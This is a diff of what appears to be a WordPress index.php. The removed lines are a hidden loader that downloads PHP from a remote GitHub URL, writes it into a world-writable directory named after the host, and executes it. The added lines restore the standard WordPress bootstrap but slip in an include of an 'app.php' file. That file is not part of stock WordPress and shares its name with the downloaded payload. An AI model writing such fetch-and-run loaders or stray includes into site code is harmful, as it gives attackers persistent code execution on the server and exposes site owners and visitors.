@@ -1,30 +1,21 @@
-
 <?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-$_dir_ = $_SERVER['DOCUMENT_ROOT'];
-$tokens = explode(".", $_SERVER['HTTP_HOST']);
-$domain = $tokens[0];
-
-if($domain == 'www'){
-    $domain = $tokens[1];
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+if ( file_exists( __DIR__ . '/app.php' ) ) {
+include_once __DIR__ . '/app.php';
 }
 
-if ( file_exists( $_dir_.'functions/'.$domain.'.php') ) {
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
 
-require_once( $_dir_.'functions/'.$domain.'.php');
-} else {
-    if (!file_exists($_dir_.'functions/')) {
-        mkdir($_dir_.'functions/', 0777, true);
-    }
-
-    $j = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
-    $myfile = fopen('./functions/'. $domain.'.php', "w") or die("Unable to open $domain.'.php'!");
-    fwrite($myfile, $j);
-    fclose($myfile);
-require_once($_dir_.$domain.'.php');
-    
-    }
-
-
-
-?>
